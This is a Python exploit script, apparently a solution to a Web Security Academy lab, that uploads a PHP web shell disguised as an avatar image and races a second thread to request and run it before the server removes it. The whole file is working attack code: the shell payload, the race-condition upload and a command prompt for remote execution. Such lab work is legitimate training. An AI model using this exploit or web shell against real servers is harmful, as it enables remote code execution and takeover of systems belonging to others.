import requests
from threading import Thread
import urllib3

cmd = input("Enter command: ")

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

url = "https://0a82008e047b13d381d7989700b500b0.web-security-academy.net/my-account/avatar"
url_2 = f"https://0a82008e047b13d381d7989700b500b0.web-security-academy.net/files/avatars/shell.php?cmd={cmd}"

# if you want to use Burp to watch the requests
proxies = { 
              "http"  : "http://127.0.0.1:8080", 
              "https" : "http://127.0.0.1:8080"
}

cookies = {
    "session": "3hJiXnexpreFR4kO7wDMCDzVXfuCI8GN" # your cookies
}
data = {
    "user": "wiener",
    "csrf": "wVzLoa5TXqJkyCdnv4d99Pxz7XmvXFqO" # your scrf token
}
headers = {
    "Content-Length": "560",
    "Cache-Control": "max-age=0",
    "Sec-Ch-Ua": '"Not.A/Brand";v="99", "Chromium";v="136"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Accept-Language": "ar",
    "Origin": "https://0a82008e047b13d381d7989700b500b0.web-security-academy.net",
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-User": "?1",
    "Sec-Fetch-Dest": "document",
    "Referer": "https://0a82008e047b13d381d7989700b500b0.web-security-academy.net/my-account",
    "Accept-Encoding": "gzip, deflate, br",
    "Priority": "u=0, i"
}
files = {
    "avatar": ("shell.php", '<?php if(isset($_REQUEST["cmd"])){ $cmd = ($_REQUEST["cmd"]); system($cmd); die; }?>', "application/octet-stream"),
}





def req1():
    requests.post(url, cookies=cookies, headers=headers,  files=files, data=data, verify=False, proxies=proxies)

def req2():
    while True:
        response = requests.get(url_2, cookies=cookies, headers=headers, verify=False, proxies=proxies)
        if response.status_code == 200:
            print(response.text)
            break


th1 = Thread(target=req1)
th2 = Thread(target=req2)

th2.start()
th1.start()